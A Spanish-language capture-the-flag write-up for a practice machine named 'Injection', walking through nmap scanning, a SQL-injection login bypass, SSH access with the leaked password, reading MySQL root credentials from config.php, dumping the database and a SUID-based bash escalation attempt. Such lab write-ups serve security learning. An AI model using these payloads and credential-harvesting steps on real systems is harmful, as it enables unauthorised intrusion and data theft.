# Máquina: Injection

- **Dificultad:** Muy fácil  
- **Tiempo estimado:** 1 hora

---

## 🔍 Escaneo inicial

Ejecutamos un escaneo básico con `nmap`:

```bash
nmap 172.17.0.3
```

Obtenemos que los puertos abiertos son:

- **22/TCP** → SSH  
- **80/TCP** → HTTP

Hacemos un escaneo más detallado sobre estos puertos:

```bash
nmap 172.17.0.3 -sV -p 22,80
```

**Resultado:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

---

## 🌐 Análisis Web

Visitamos la dirección `http://172.17.0.3` en el navegador y encontramos una **página de login**.

Dado que la máquina se llama *Injection*, probamos una inyección SQL simple:

- Usuario: `'admin' or 1=1;`
- Contraseña: (cualquier valor)

**Resultado:** Accedemos exitosamente y vemos el siguiente mensaje:

```
Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
```

Tenemos:
- **Usuario:** Dylan
- **Contraseña:** KJSDFG789FGSDF78

---

## 🔐 Acceso por SSH

Probamos a conectarnos con esas credenciales:

```bash
ssh dylan@172.17.0.3
```

**Acceso exitoso.**

---

## 🛠️ Enumeración interna

Intentamos enumerar con `sudo -l`, pero no está disponible.

Explorando el sistema, encontramos un archivo interesante en:

```
/var/www/html/config.php
```

Contenido:

```php
return [
    'db' => [
        'host' => 'localhost',
        'user' => 'root',
        'passwd' => 'paso',
        'dbname' => 'register',
        'options' => [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
        ]
    ]
];
```

---

## 🧬 Acceso a MySQL

Usamos las credenciales para acceder a la base de datos:

```bash
mysql -u root -ppaso
```

Una vez dentro:

```sql
show databases;
use register;
select * from users;
```

**Resultado:**

```
+----------+------------------+
| username | passwd           |
+----------+------------------+
| dylan    | KJSDFG789FGSDF78 |
+----------+------------------+
```

Ya conocíamos estos datos, pero ahora sabemos que tenemos control total sobre la base de datos.

Probamos a insertar y eliminar usuarios:

```sql
INSERT INTO users VALUES ('prueba','123456');
DELETE FROM users WHERE username='prueba';
```

También podemos exportar la base de datos:

```bash
mysqldump --databases register -u root -ppaso > datos.sql
```

---

## 🧨 Escalada de privilegios

Buscamos archivos con el bit SUID activado:

```bash
find / -perm -4000 -user root 2>/dev/null
```

Una opción útil es:

```bash
/usr/bin/env /bin/bash -p
```

---

## ✅ Estado actual

- ✅ Acceso SSH como **dylan**
- ✅ Acceso completo a la base de datos MySQL
- ⛔ No se ha logrado escalar privilegios a root (por ahora)










